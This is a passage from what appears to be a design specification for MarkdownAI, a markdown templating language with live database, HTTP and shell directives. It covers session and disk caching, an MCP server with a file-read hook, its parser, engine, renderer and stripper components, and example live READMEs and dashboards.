**7. Transparency.** Every dynamic directive execution is logged. Every blocked attempt is logged. Every masking event is logged. Security alerts always print to the terminal.

**8. No silent failures above WARN.** `SECURITY_ALERT` and `FATAL` always print regardless of mode. Authors and operators always know when something significant happened.

**9. Document authors have zero trust.** A document cannot grant itself permissions. A document cannot modify the security config. A document cannot disable masking or suppress security alerts. The project hint file communicates intent -- it grants nothing.

**10. Graceful degradation.** By default, jailed directives are stripped and sensitive content is masked. A document from an untrusted source renders safely -- dynamic content is stripped, sensitive file content is masked. Nothing crashes. Nothing leaks.

---

## Caching

### Why Caching Is Critical

MarkdownAI documents are live -- they query databases, make HTTP requests, execute shell commands, and read files. Without caching, every render is a full round-trip to every data source. In an MCP session where the AI may request the same phase multiple times, that is expensive and potentially inconsistent.

**Performance** -- a phase that queries three databases and makes two HTTP requests takes seconds without caching. With session caching it takes milliseconds on every subsequent read. The AI gets faster responses and can work through more phases per session.

**Consistency -- the AI correctness argument** -- a database that changes mid-session can cause the AI to see different data across two reads of the same phase. That leads to wrong reasoning, hallucinated diffs, and broken decisions. `@cache session` is a consistency guarantee. The AI sees identical data for the entire session regardless of what changes in the underlying sources.

**Development fixture system** -- `@cache persist` turns MarkdownAI into a fixture system. Seed real data from a live source once. Develop entirely offline with realistic data. Never maintain mock files. Never wait for database connections during development.

---

### `@cache` Syntax

`@cache` is a modifier appended to any data-producing directive. It is always the last token on the directive line.

**Cache modes:**

```
@cache                           -- session cache, no expiry
@cache session                   -- session cache, no expiry (explicit)
@cache ttl=300                   -- session cache, 5 minute TTL
@cache persist                   -- disk cache, no expiry
@cache persist ttl=86400         -- disk cache, 24 hour TTL
@cache mock=./fixtures/data.json -- always return fixture, never hit source
```

**Applied to directives:**

```
@import ./shared/defaults.md @cache session
@include ./shared/footer.md @cache session
@read ./config/countries.json @cache persist
@db query="db.products.find().limit(20)" @cache persist
@db query="db.errors.countDocuments()" @cache ttl=300
@http url="https://api.github.com/repos/markdownai/core" path="stargazers_count" @cache ttl=3600
@query "git log --oneline -1" @cache ttl=60
@list ./src/ match="**/*.ts" @cache ttl=30
```

`@cache` never applies to `@render` -- `@render` formats data, it produces no cacheable output of its own.

---

### Cache Modes

**`@cache` / `@cache session`**

Cached for the duration of the current `mai serve` session or MCP server instance. Executes once on first access. Every subsequent call returns the cached result instantly. Cleared when the server stops.

This is the primary consistency guarantee for AI sessions:

```
@db query="db.products.find().limit(10)" @cache session | @render type="table"
```

First call -- queries database, caches result, returns rendered table.
Every subsequent call in the session -- returns cached table instantly. Database never queried again.

**`@cache ttl=N`**

Time-to-live in seconds. Cached result is used until TTL expires, then re-fetched on next access. Works for both session and persist modes.

```
@db query="db.errors.countDocuments({level:'critical'})" @cache ttl=300
@http url=env.STATUS_API path="status" @cache ttl=60
@query "git log --oneline -1" @cache ttl=60
```

TTL-based caching is appropriate for data that changes periodically but doesn't need to be real-time. Error counts, git history, API metrics -- useful to have fresh every few minutes but not on every single render.

**`@cache persist`**

Cached to disk at `~/.markdownai/cache/`. Survives server restarts and new sessions. Never expires unless TTL is set or the cache is explicitly cleared.

```
@read ./config/countries.json @cache persist
@db query="db.products.find({active:true})" @cache persist
@http url="https://api.github.com/repos/markdownai/core" path="stargazers_count" @cache persist ttl=86400
```

The primary use case for `@cache persist` is development workflow -- seed real data once, develop offline indefinitely:

```bash
# Seed cache from production
mai cache seed input.md --env .env.production

# Develop with no network, no database
mai watch input.md -o dist/

# Refresh when production data changes significantly
mai cache seed input.md --env .env.production
```

**`@cache mock=./path/to/fixture.json`**

Always returns the fixture file contents. Never executes the directive. No database connection. No HTTP request. No shell execution. Complete offline development.

```
@db query="db.products.find({active:true})" @cache mock=./fixtures/products.json | @render type="table"
@http url=env.METRICS_API @cache mock=./fixtures/metrics.json | @render type="bar"
@query "npm audit --json" @cache mock=./fixtures/audit.json | jq '.vulnerabilities' | @render type="table"
```

The fixture file is plain JSON matching the shape the directive would normally return. When ready to go live, remove `@cache mock=` and the real directive executes.

Mock mode is never invalidated by `mai cache clear` -- it is a hard override. To stop using a mock, remove the `@cache mock=` modifier from the directive.

---

### Cache Key Generation

The cache key is a hash of the full resolved directive string including all options. Two directives with the same `@cache` mode but different queries, paths, or options have different cache keys.

```
@db query="db.products.find()" @cache persist     ← key: hash("db:db.products.find()")
@db query="db.users.find()" @cache persist         ← key: hash("db:db.users.find()") -- different key
```

Cache entries are document-scoped. The same directive in two different documents produces separate cache entries.

---

### What to Cache

| Directive | Recommended | Reason |
|---|---|---|
| `@import ./shared/defaults.md` | `@cache session` | Definitions never change mid-session |
| `@include ./shared/footer.md` | `@cache session` | Static content, no reason to re-read |
| `@read ./config/countries.json` | `@cache persist` | Static reference data |
| `@read ./package.json path="version"` | `@cache session` | Changes only on deploy |
| `@db query="db.products.find()"` | `@cache persist` or `@cache ttl=300` | Depends on update frequency |
| `@db query="db.errors.countDocuments()"` | `@cache ttl=60` | Should be reasonably fresh |
| `@db query="db.users.find()"` | No cache | Live data, should be current |
| `@http url="https://api.github.com/..."` | `@cache ttl=3600` | Rate limited, infrequent changes |
| `@query "git log --oneline -1"` | `@cache ttl=60` | Changes only on commit |
| `@query "npm test"` | Never cache | Always run fresh |
| `@list ./src/ match="**/*.ts"` | `@cache ttl=30` | Changes during active development |

**The general rule:** Cache anything that does not need to change within a session. For AI sessions specifically, `@cache session` on all `@db` and `@http` directives is strongly recommended unless real-time data is explicitly required.

---

### Cache and `@cache` on `@include` and `@import`

When `@cache session` is applied to `@include` or `@import`:

- The file is read, parsed, and processed once
- The rendered output (for `@include`) or definition registrations (for `@import`) are cached
- Subsequent reads return the cached result without re-reading or re-parsing the file
- Macro definitions and connections from a cached `@import` remain in the registry for the session regardless -- the cache prevents re-parsing, not re-using definitions

This is particularly valuable for large shared definition files with many `@define` macros -- parsed once per session, available everywhere.

---

### Cache Management -- `mai cache`

```bash
# View cache state
mai cache show                          # all cached entries
mai cache show input.md                 # entries for a specific document
mai cache show --expired                # entries past their TTL
mai cache show --persist                # disk cache only
mai cache show --session                # session cache only

# Invalidate cache
mai cache clear                         # clear all caches
mai cache clear --session               # session cache only
mai cache clear --persist               # disk cache only
mai cache clear input.md                # all caches for a specific document
mai cache clear --directive db          # all @db results across all documents
mai cache clear --directive http        # all @http results
mai cache clear --expired               # only expired TTL entries

# Seed cache explicitly
mai cache seed input.md                 # re-execute all @cache directives
mai cache seed input.md --env .env.production   # seed from specific environment
mai cache seed input.md --directive db          # only @db directives
mai cache seed input.md --directive http        # only @http directives
```

**MCP server tool:**

```
invalidate_cache(file?, directive?)
```

The AI can request cache invalidation when it knows data has changed -- for example after running a migration, pushing a commit, or deploying a change. This allows the AI to reason accurately without restarting the session.

---

### Cache Storage and Security

**Session cache** -- held in memory by the MCP server process. Never written to disk. Cleared on process exit. No security implications beyond the process memory.

**Persist cache** -- written to `~/.markdownai/cache/` with permissions `700` (owner read/write only). Cache files are named by content hash, not by query content -- no sensitive query strings are exposed in filenames.

**Masking applies before caching** -- the same content masking rules that apply to `@include` output apply to what is written to the cache. Sensitive values are masked before the result is stored. A cached `@db` result never contains unmasked credentials even if the query returned them.

**Mock files** -- `@cache mock=./fixture.json` fixture files are subject to the same filesystem confinement and masking rules as `@include`. Absolute paths and traversal are blocked. Sensitive content is masked.

---

### Cache and AI Session Consistency

For AI workflows using `@phase` and the MCP server, the recommended pattern is:

```
@markdownai
@connect db type="mongodb" uri=env.MONGODB_URI

@define project_state
## Live Project State

@db query="db.collections.listNames()" @cache session | @render type="list"
@db query="db.migrations.find({status:'pending'})" @cache session | @render type="table"
@query "git status --short" @cache session | @render type="code"
@read ./package.json path="version" @cache session
@end

@phase build
  @call project_state
  @include ./phases/build.md
@end

@phase test
  @call project_state
  @include ./phases/test.md
@end
```

`project_state` is called at the start of every phase. `@cache session` ensures the AI sees identical state across all phases -- the migration list, collection names, git status, and version number are consistent from phase 1 to phase N regardless of what changes in the underlying systems mid-session.

Without `@cache session`, a database write in phase 2 could change what phase 3 sees when it calls `project_state`. The AI would be reasoning about an inconsistent world. With `@cache session`, the world is frozen at the start of the session and the AI reasons about a stable snapshot.

This is the correct default for AI-driven workflows. Only disable caching on directives where real-time data is genuinely required by the task.

---

## Runtime Detection

### How the MCP Server Identifies MarkdownAI Files

When Claude or any MCP client attempts to read a `.md` file, a PreToolUse hook intercepts the request:

1. Is this a `.md` file?
2. Read first line -- approximately 20 bytes
3. Does it start with `@markdownai`?
4. **Yes** -- route through MCP server `read_file` tool
5. **No** -- allow normal file read

This check is near-zero overhead. Files without the header are never touched.

### Hook Implementation

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Read",
        "command": "mai hook --check-header"
      }
    ]
  }
}
```

### Why This Architecture

The hook approach means:

- Zero configuration for the AI -- it just tries to read files normally
- Zero new syntax for the AI -- it receives clean resolved markdown
- Zero context pollution -- the AI never sees unresolved directives
- Zero performance cost on non-MarkdownAI files

The AI is entirely unaware of the MarkdownAI runtime. It requests a file, receives resolved content. The runtime is invisible.

---

## Toolchain Architecture

### Overview

The MarkdownAI toolchain is six components with clean, non-overlapping responsibilities. Each component does exactly one thing. The language spec is the contract they all implement.

```
Source .md file
      │
      ▼
   Parser                     reads source, produces AST
      │
      ├──► Stripper            removes all @syntax, outputs clean .md
      │
      └──► Template Engine     walks AST, executes logic, resolves pipes
                  │
                  ├──► Renderer          formats resolved data as markdown
                  │
                  └──► MCP Server        provides live context (db, http, shell)
                              │
                              └──► Hook  gates AI file reads, routes to MCP
```

**The spec is the source of truth.** Every directive defined in the spec maps to a node in the parser AST, a resolution rule in the template engine, a format in the renderer, and a removal rule in the stripper. Adding a new directive means updating the spec first, then implementing one file per component.

---

### The Parser

**Responsibility:** Read a `.md` source file, identify all MarkdownAI directives, and produce an AST. The parser resolves nothing -- it only understands structure.

**Input:** Raw `.md` source text

**Output:** A structured AST document:

```typescript
{
  isMarkdownAI: boolean,
  version: string | null,
  nodes: ASTNode[]
}
```

**Node types -- one per directive:**

| Directive | AST Node Type |
|---|---|
| `@markdownai` | `header` |
| `@include` | `include` |
| `@import` | `import` |
| `@env` | `env` |
| `@define ... @end` | `define` |
| `@call` | `call` |
| `@phase ... @end` | `phase` (contains `transition` child nodes) |
| `@on complete ->` | `transition` (child of `phase` only) |
| `@connect` | `connect` |
| `@list` | `list` |
| `@read` | `read` |
| `@query` | `query` |
| `@db` | `db` |
| `@http` | `http` |
| `@tree` | `tree` |
| `@date` | `date` |
| `@count` | `count` |
| `@render` | `render` |
| `@if ... @endif` | `conditional` |
| Pipe chain | `pipe` |
| ` ```mai-graph ` block | `graph` |
| Everything else | `markdown` |
| `{{ expression }}` | `interpolation` |
| Unknown `@directive` | `passthrough` |

**Implementation rules:**

- Single-pass line reader -- no backtracking
- A line beginning with `@` as the first non-whitespace character is a directive line
- One directive per line -- with three explicit exceptions documented below
- Block directives (`@define`, `@phase`, `@if`) track nesting depth for `@end`/`@endif`
- `@on complete ->` is a `transition` sub-directive, only valid inside `@phase ... @end` blocks -- parse error outside a phase block
- `@phase` in an `@import`ed file is always a parse error -- phases only valid in root document
- `@phase` in an `@include`d file is valid -- tags stripped, body content renders normally
- `@local` is a scope modifier on `@define` and `@connect` lines -- always the last token
- `@local` is unambiguous: parameters are inside `()`, `@local` is outside; no parameter name starts with `@`
- Unknown `@` directives become `passthrough` nodes -- never errors
- `@include` and `@import` share a single resolution stack and completed-files set -- see File Resolution Model
- The parser never touches the filesystem, environment, or any external resource

**The three valid multi-`@` line patterns:**

**1. Pipe chains** -- source directive followed by `|` stages terminating in `@render`:
```
@list ./src/ | sort | @render type="list"
```
Entire line is parsed as a single `pipe` node. `@render` is the pipe sink token -- valid only as the final pipe stage, never as a standalone directive.

**2. Phase transitions** -- `@on complete -> @call` inside `@phase` blocks only:
```
@on complete -> @call final_update
```
`@on complete ->` is a `transition` sub-directive of `@phase`. `@call macroname` is its action target. Only valid inside `@phase ... @end` blocks -- parse error elsewhere. Multiple `@on complete ->` lines execute sequentially top to bottom.

**3. Everything else** -- one directive per line, no exceptions. Two directives on a line outside these patterns is a parse error.

**Directive modularity:**

Every directive is a self-contained module implementing a standard interface. The parser loads a registry of directive modules and delegates parsing to them. Adding a new directive means adding one file -- nothing else in the parser changes.

```typescript
interface DirectiveModule {
  name: string          // directive name e.g. "include", "db"
  block: boolean        // true if directive has @end closing tag
  parse(line: string, args: string): ASTNode
}
```

**Directory structure:**

```
packages/parser/
  src/
    directives/
      header.ts
      include.ts
      import.ts
      env.ts
      define.ts
      call.ts
      phase.ts
      connect.ts
      list.ts
      read.ts
      query.ts
      db.ts
      http.ts
      tree.ts
      date.ts
      count.ts
      render.ts
      if.ts
      graph.ts
      pipe.ts
    registry.ts       -- loads and registers all directive modules
    lexer.ts          -- line-by-line tokenizer
    parser.ts         -- builds AST from token stream
    types.ts          -- ASTNode type definitions
  index.ts
```

**Package:** `@markdownai/parser` -- published standalone so anyone can build on it

---

### The Template Engine

**Responsibility:** Walk the parser AST, execute directive logic, resolve pipe chains, substitute macro parameters, evaluate conditionals. The engine produces resolved data -- it does not care about markdown formatting.

**Input:** Parser AST + Context (environment, connections, macro registry, phase state)

**Output:** Resolved data ready for the renderer

**What the engine handles:**

- Walks AST nodes in order
- Calls each directive module's `execute` method
- Manages the macro registry (`@define` registers, `@call` looks up and substitutes `{{ params }}`)
- Evaluates `@if` conditions against live context
- Executes pipe chains -- calls source directive, passes output through Linux pipe stages, hands result to `@render`
- Manages phase state -- tracks active phase, resolves `@on complete ->` transitions
- Delegates live operations to the MCP server context provider when available

**Pipe chain execution:**

```
@list ./src/ match="**/*.ts" | grep -v test | sort | @render type="list"
```

1. Engine calls `list` directive module -- returns string array
2. Engine spawns `grep -v test` as child process, pipes array as stdin, captures stdout
3. Engine spawns `sort` as child process, pipes result as stdin, captures stdout
4. Engine calls `render` directive module with final output and `type="list"`
5. Renderer formats as markdown unordered list

**Context object:**

```typescript
interface EngineContext {
  env: Record<string, string>              // process environment variables
  envFiles: Record<string, string>         // --env file values
  envFallbacks: Record<string, string>     // @env fallbacks from @import files
  connections: Record<string, Connection>  // @connect registry
  macros: Record<string, MacroNode>        // @define registry
  phase: string | null                     // active phase name
  cwd: string                              // working directory
  shell: boolean                           // shell execution allowed
  mcp: MCPContext | null                   // live MCP server context
}
```

**Env resolution in the engine:**

```typescript
function resolveEnv(key: string, directiveFallback: string | null, ctx: EngineContext): string {
  return ctx.env[key]                    // process.env -- highest priority
    ?? ctx.envFiles[key]                 // --env file
    ?? ctx.envFallbacks[key]             // @import fallback registry
    ?? directiveFallback                 // fallback= on directive
    ?? ""                                // empty string -- never an error
}
```

**Directive modularity:**

Every directive module implements an `execute` method alongside its `parse` method. The engine calls `execute` for each node. Same file, same module -- parse and execute live together.

```typescript
interface DirectiveModule {
  name: string
  block: boolean
  parse(line: string, args: string): ASTNode
  strip(node: ASTNode): string
  execute(node: ASTNode, ctx: EngineContext): Promise<string>
}
```

**Directory structure:**

```
packages/engine/
  src/
    pipe.ts           -- pipe chain orchestration
    macros.ts         -- define registry, param substitution
    conditions.ts     -- @if evaluation
    context.ts        -- context object management
    shell.ts          -- Linux pipe stage execution
    cache.ts          -- session and persist cache manager
    engine.ts         -- main AST walker
  index.ts
```

**Package:** `@markdownai/engine` -- internal, consumed by renderer, MCP server, and CLI

---

### The Renderer

**Responsibility:** Take resolved string data from the template engine and format it as clean markdown output.

**Input:** Resolved string data + render type

**Output:** Formatted markdown string

**The renderer has no knowledge of directives, pipes, or resolution logic.** It receives data and a format instruction. It formats. That is all.

**Format types:**

| Type | Markdown Output |
|---|---|
| `list` | Unordered markdown list |
| `numbered` | Ordered markdown list |
| `links` | List of markdown links |
| `table` | Markdown table |
| `code` | Fenced code block |
| `inline` | Plain string, no wrapping |
| `bar` | ASCII horizontal bar chart |
| `flow` | ASCII flow diagram with arrows |
| `tree` | ASCII indented tree for nested structures |
| `timeline` | ASCII left-to-right timeline |
| `json` | Pretty-printed fenced JSON code block |

**ASCII chart rendering -- all charts are ASCII, not Mermaid:**

ASCII renders everywhere -- terminals, AI context windows, email, any plain text viewer. No renderer required. No JavaScript. No dependencies.

```
bar chart:
auth_failure    ████████████████████ 847
timeout         █████████████ 534
rate_limit      ████████ 312

flow:
init ──► plan ──► build ──► test ──► deploy

timeline:
[init] ──── [plan] ──── [build] ──── [test] ──── [deploy]
```

**Format modularity:**

Each format type is a separate file. Adding a new format type means adding one file to the formats directory.

```
packages/renderer/
  src/
    formats/
      list.ts
      numbered.ts
      links.ts
      table.ts
      code.ts
      inline.ts
      bar.ts
      flow.ts
      tree.ts
      timeline.ts
      json.ts
    renderer.ts     -- dispatches to format modules
  index.ts
```

**Package:** `@markdownai/renderer` -- published standalone

---

### The Stripper

**Responsibility:** Walk the parser AST and remove all MarkdownAI syntax. Output clean standard markdown that any renderer can handle. No resolution. No execution. Pure syntax removal.

**Input:** Parser AST

**Output:** Vanilla `.md` with zero MarkdownAI directives

**The stripper does not use the template engine or renderer.** It is a simple AST walker that maps each node type to a removal or passthrough rule.

**Removal rules:**

| Node Type | Stripper Output |
|---|---|
| `header` | Removed |
| `include` | Removed -- file inlining is a renderer concern, not stripper |
| `import` | Removed -- definition registration is a renderer/engine concern, not stripper |
| `env` | Removed |
| `define` | Removed entirely including body |
| `call` | Removed |
| `connect` | Removed |
| `list` | Removed |
| `read` | Removed |
| `query` | Removed |
| `db` | Removed |
| `http` | Removed |
| `tree` | Removed |
| `date` | Removed |
| `count` | Removed |
| `render` | Removed |
| `conditional` | Evaluated against current environment -- matching branch rendered, other branches removed, directive tags removed. Unset variables evaluate to empty string -- see Conditional Stripping Behavior below |

**Conditional Stripping Behavior:**

When `mai strip` evaluates `@if` conditions, unset environment variables resolve to empty string. A condition comparing an unset variable against a non-empty value always evaluates to false -- causing `@else` blocks to render and `@if` blocks to be skipped. This can produce silently wrong output if the author expected a variable to be set.

**`@if` condition evaluation table:**

| Scenario | Result | Stripper behavior |
|---|---|---|
| Variable set, condition true | `true` | `@if` block renders, `@else` removed |
| Variable set, condition false | `false` | `@if` block removed, `@else` renders |
| Variable unset, no fallback | `false` -- empty string | `@else` renders, WARN logged |
| Variable unset, with `??` fallback | Fallback value evaluated | Normal evaluation |
| No `--env` flag, conditions present | All unset vars → false | WARN per unset variable |

**Always provide `--env` when stripping conditional documents:**

```bash
mai strip input.md --env .env.production -o output-production.md
mai strip input.md --env .env.development -o output-development.md
```

The recommended pattern for conditional stripping is to run `mai strip` once per environment variant with the appropriate `--env` file. This produces correct output for each environment.

**`mai validate` catches this before stripping:**

```bash
mai validate input.md
```

Reports every `@if` condition that references an unset variable so the author knows to provide `--env` before stripping:

```
⚠ @if condition references env.NODE_ENV -- not set, will evaluate to false (line 12)
  Run with --env .env to provide this value, or the @else branch will render instead.
⚠ @if condition references env.TIER -- not set, will evaluate to false (line 34)
```
| `phase` | Body kept, `@phase`/`@end` tags removed (root doc); body kept same way in @include; @import raises parse error before stripper runs |
| `graph` | Passed through unchanged |
| `markdown` | Passed through unchanged |
| `passthrough` | Passed through unchanged |
| `pipe` | Removed |

**CLI usage:**

```bash
mai strip input.md                    # stdout
mai strip input.md -o output.md       # file output
mai strip ./docs/ -o ./dist/          # directory
mai strip ./docs/ -o ./dist/ --watch  # watch mode
```

**Lives in the CLI package.** The stripper is not a separate npm package -- it is a thin AST walker with no dependencies beyond the parser. It ships as part of `markdownai`.

---

### The MCP Server

**Responsibility:** Provide the template engine with live context -- database connections, HTTP requests, shell execution -- and serve fully resolved markdown to AI clients on demand. Manage phase state and macro registry across a session.

**Input:** MCP tool calls from AI clients

**Output:** Fully resolved markdown content

**What the MCP server provides that the static engine cannot:**

- Persistent database connections via `@connect`
- Shell command execution via `@query`
- HTTP requests via `@http`
- Macro registry persisted across tool calls
- Phase state tracked across a session
- Parser AST cache per file (invalidated on file change)
- `@graph` block conversion to ASCII for AI context

**MCP tools exposed:**

```
read_file(path)
  Intercepts file reads. Detects @markdownai header.
  Routes through engine + renderer. Returns resolved markdown.
  Non-MarkdownAI files pass through untouched.

resolve_phase(file, phase)
  Returns resolved markdown for a single named phase only.
  Loads only this phase -- nothing else enters context.

list_phases(file)
  Returns phase manifest: names, transitions, graph structure.
  Phase structure derived from @on complete -> declarations.
  If @graph exists, included for visualization -- never used for sequencing logic.
  No phase content loaded. Zero context cost.

call_macro(file, macro, args?)
  Resolves a named macro with parameter substitution.
  Macro registry persists across calls.

get_env(key, fallback?)
  Resolves environment variable from server environment.

next_phase(file, current_phase)
  Returns next phase name from @on complete -> declarations.
  Evaluates conditional transitions against live environment.
  @on complete -> transitions are always the source of truth -- @graph is never consulted.

execute_directive(directive)
  Executes a single directive string and returns output.
  For one-off resolution without full file context.

invalidate_cache(file?, directive?)
  Invalidates session cache entries. Optional file path and directive type filter.
  Allows the AI to request fresh data after a known change without restarting the session.
  Example: after running a migration, call invalidate_cache(directive="db") to get fresh query results.
```

**Context management -- lazy loading for AI context:**

A 20-phase document never loads all 20 phases simultaneously. The AI calls `resolve_phase` for the active phase, works through it, calls `next_phase`, loads the next phase. Completed phases are never reloaded. The context window only ever contains what is actively needed.

**CLI usage:**

```bash
mai serve                              # start MCP server
mai serve                              # start MCP server (shell execution via security config)
mai serve --cwd /path/to/project       # set working directory
```

**Package:** `@markdownai/mcp`

---

### The Hook

**Responsibility:** Ensure AI engines always use the MCP server for MarkdownAI files. Intercept file read attempts, check the first line, route accordingly.

**The hook does not do work. It is a gate.**

```
AI attempts to read file.md
          │
          ▼
  Hook fires (PreToolUse)
          │
  Reads first line (~20 bytes)
          │
  @markdownai present?
     │              │
    YES              NO
     │              │
  Block read    Allow read
  Call MCP      Do nothing
  read_file()
```

**Implementation:**

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Read",
        "command": "mai hook --check-header"
      }
    ]
  }
}
```

**Why this approach:**

- Zero configuration for the AI -- it reads files normally
- Zero new syntax for the AI -- it receives clean resolved markdown
- Zero context pollution -- the AI never sees unresolved directives
- Zero cost on non-MarkdownAI files -- hook exits immediately
- The AI is entirely unaware of the runtime -- it is invisible

**Installed via:**

```bash
mai init     # installs hook into Claude Code / MCP client config
```

**Lives in the CLI package.** ~50 lines of code. Ships last, built in minutes.

---

### Build Order

The critical path is determined by dependencies:

```
1. Parser          -- foundation, everything depends on this
2. Stripper        -- simplest parser consumer, first shippable artifact
3. Renderer        -- format modules, no external dependencies
4. Template Engine -- depends on parser + renderer
5. MCP Server      -- depends on parser + engine + renderer
6. Hook            -- trivial, depends on MCP server existing
```

**Phase 1 -- Parser + Stripper + CLI (strip command)**
First thing users can install. Proves the concept. `npm install -g @markdownai/core` and `mai strip` works.

**Phase 2 -- Renderer + Engine + CLI (render + build commands)**
Static resolution without live connections. `mai render` and `mai build` work. Full value for non-AI use cases.

**Phase 3 -- MCP Server + CLI (serve command)**
Live connections. `@db`, `@http`, `@query` work. Full AI context management.

**Phase 4 -- Hook + CLI (init command)**
`mai init` installs the hook. AI engines route automatically.

---

### Package Structure

```
markdownai/                         (monorepo)
  packages/
    parser/                         @markdownai/parser
      src/
        directives/                 one file per directive
          include.ts
          import.ts
          env.ts
          define.ts
          call.ts
          phase.ts
          connect.ts
          list.ts
          read.ts
          query.ts
          db.ts
          http.ts
          tree.ts
          date.ts
          count.ts
          render.ts
          if.ts
          graph.ts
          pipe.ts
        registry.ts
        lexer.ts
        parser.ts
        types.ts
    engine/                         @markdownai/engine
      src/
        pipe.ts
        macros.ts
        conditions.ts
        context.ts
        shell.ts
        engine.ts
    renderer/                       @markdownai/renderer
      src/
        formats/
          list.ts
          numbered.ts
          links.ts
          table.ts
          code.ts
          inline.ts
          bar.ts
          flow.ts
          tree.ts
          timeline.ts
          json.ts
        renderer.ts
    mcp/                            @markdownai/mcp
      src/
        tools/
          read_file.ts
          resolve_phase.ts
          list_phases.ts
          call_macro.ts
          get_env.ts
          next_phase.ts
          execute_directive.ts
        connections.ts
        cache.ts
        server.ts
    cli/                            markdownai
      src/
        commands/
          strip.ts
          render.ts
          build.ts
          serve.ts
          validate.ts
          init.ts
          hook.ts
        index.ts
  SPEC.md
  CHANGELOG.md
  README.md
```

**Adding a new directive** -- the full checklist:

1. Update `SPEC.md` -- define syntax, options, behavior
2. Add `packages/parser/src/directives/newdirective.ts` -- implements `parse`, `strip`, `execute`
3. Register in `packages/parser/src/registry.ts`
4. Add format module if new render type needed: `packages/renderer/src/formats/newformat.ts`
5. Done

Nothing else changes. The parser, engine, renderer, stripper, and MCP server all pick up the new directive automatically through the registry.

**Third-party directives:**

```bash
npm install @markdownai/directive-slack
```

```typescript
import { slack } from '@markdownai/directive-slack'
registry.register(slack)
```

`@slack channel="general"` now works. The core is never touched.

---

## The Stripper

`mai strip` converts any `.md` file to clean standard markdown with all MarkdownAI syntax removed.

```bash
npm install -g @markdownai/core

mai strip input.md                       # stdout
mai strip input.md -o output.md          # file
mai strip input.md --env .env            # with env file
mai strip ./docs/ -o ./dist/             # directory
mai strip ./docs/ -o ./dist/ --watch     # watch mode
```

See the Stripper section in Toolchain Architecture for the full removal rules table.

**`mai render`** -- resolves all static directives:

```bash
mai render input.md -o output.md --env .env
```

**`mai build`** -- full static build including live directives:

```bash
mai build input.md -o output.md --env .env
```

Executes all directives including `@query`, `@db`, and `@http`. Produces a completely static snapshot.

**Distribution workflow:**

- Author in `.md` with MarkdownAI directives
- Commit source to version control
- CI runs `mai build`, commits static output
- Consumers receive fully resolved portable markdown

```bash
npm install -g @markdownai/core

mai strip input.md                       # stdout
mai strip input.md -o output.md          # file
mai strip input.md --env .env            # with env file
mai strip ./docs/ -o ./dist/             # directory
mai strip ./docs/ -o ./dist/ --watch     # watch mode
```

**Resolution rules:**

| Directive | Stripped Output |
|---|---|
| `@markdownai` | Removed |
| `@include ./file.md` | Full resolved content (renderer); directive line removed (stripper) |
| `@import ./file.md` | Directive line removed -- definitions are an engine concern, not stripper |
| `@include ./file.md if ...` | Content if true, empty if false |
| `@env VAR` | Resolved value or empty string |
| `@env VAR fallback="x"` | Resolved value or fallback |
| `@define ... @end` | Removed entirely |
| `@call macro` | Resolved macro content |
| `@connect ...` | Removed |
| `@list ...` | Resolved file listing |
| `@read ...` | Resolved value |
| `@query "..."` | Stripped -- shell execution requires security config |
| `@db ...` | Stripped -- database execution requires security config |
| `@http ...` | Stripped -- HTTP execution requires security config |
| `@tree ...` | Resolved ASCII tree |
| `@date ...` | Resolved date value |
| `@count ...` | Resolved count |
| `@render ...` | Resolved rendered output |
| `@if ... @endif` | Evaluated, included or excluded |
| `@phase ... @end` | Body content only |
| ` ```mai-graph ` | Passed through unchanged |
| Unknown `@directive` | Passed through unchanged |

**Note on live directives:** `@query`, `@db`, and `@http` require a live runtime environment. The stripper strips these rather than executing them. Use `mai serve` (MCP server) for live resolution, or `mai build` for a full build that executes all live directives and produces completely resolved static output.

**`mai build`** -- full static build including live directives:

```bash
mai build input.md -o output.md --env .env
```

Executes all directives including `@query`, `@db`, and `@http`, producing a completely static snapshot of the document at build time.

**Distribution workflow:**

- Author in `.md` with MarkdownAI directives
- Commit source to version control
- CI runs `mai build` and commits static output
- Consumers receive fully resolved portable markdown

---

## Adoption Path

**Level 0 -- Standard markdown.**
No changes. All existing files work exactly as today.

**Level 1 -- Variables.**
Add `@markdownai` and `@env` to centralize emails, versions, copyright. Run `mai strip` to resolve. One change propagates everywhere.
*Who benefits: anyone with repeated boilerplate across multiple files.*

**Level 2 -- Includes.**
Split large documents with `@include`. No more copy-paste. No more "which version is current?"
*Who benefits: anyone managing documentation that has outgrown a single file.*

**Level 3 -- Macros.**
Define repeated procedures once with `@define`. Call with `@call`.
*Who benefits: anyone with repeated procedures or templates.*

**Level 4 -- Live data.**
Add `@read`, `@list`, `@query`. Documents reflect actual current state.
*Who benefits: anyone whose documentation drifts from reality.*

**Level 5 -- Database and API.**
Add `@connect`, `@db`, `@http`. Documents query live data sources.
*Who benefits: teams with documentation tied to live systems.*

**Level 6 -- Phases and MCP.**
Add `@phase`, install MCP server. Full AI context management.
*Who benefits: AI developers, MDD practitioners, complex multi-phase workflows.*

---

## Real-World Use Cases

### A README That Cannot Lie

```
@markdownai

# {{ read ./package.json path="name" }}

{{ read ./package.json path="description" }}

Version {{ read ./package.json path="version" }} --
@query "git log --oneline -1"

## Stats

This project contains {{ count ./src/ match="**/*.ts" }} TypeScript files
across {{ count ./src/ match="**/" type="dirs" }} directories,
with {{ read ./coverage/summary.json path="total.lines.pct" }}% test coverage.

## Dependencies

@read ./package.json path="dependencies" | sort | @render type="table"

## Recent Changes

@query "git log --pretty=format:'- %s' -10" | @render type="list"

---
© {{ date format="YYYY" }} {{ env.AUTHOR_NAME }}
{{ env.SUPPORT_EMAIL }}
```

Every value live. Version from package.json. File count from filesystem. Coverage from coverage report. Commits from git. This README never needs manual updating.

---

### Documentation Site Footer

`shared/footer.md`:

```
@markdownai
---
© {{ date format="YYYY" }} {{ env.COMPANY_NAME }}. All rights reserved.
Contact: {{ env.SUPPORT_EMAIL }}
Version {{ env.DOCS_VERSION }}
```

200 documentation pages each include:

```
@include ./shared/footer.md
```

Update the company name, support email, or version once. All 200 pages update on next build.

---

### Live Database Dashboard in Markdown

```
@markdownai
@connect db type="mongodb" uri=env.MONGODB_URI
@connect analytics type="postgres" uri=env.POSTGRES_URI

# System Status -- @date format="YYYY-MM-DD HH:mm"

## User Metrics
@db using="db" query="db.users.countDocuments({active:true})" active users,
@db using="db" query="db.users.countDocuments({createdAt:{$gte:new Date(Date.now()-86400000)}})" new today

## Top Errors (Last 24h)
@db using="analytics" query="SELECT message, count FROM errors WHERE ts > NOW() - INTERVAL '24 hours' ORDER BY count DESC LIMIT 5" | @render type="bar"

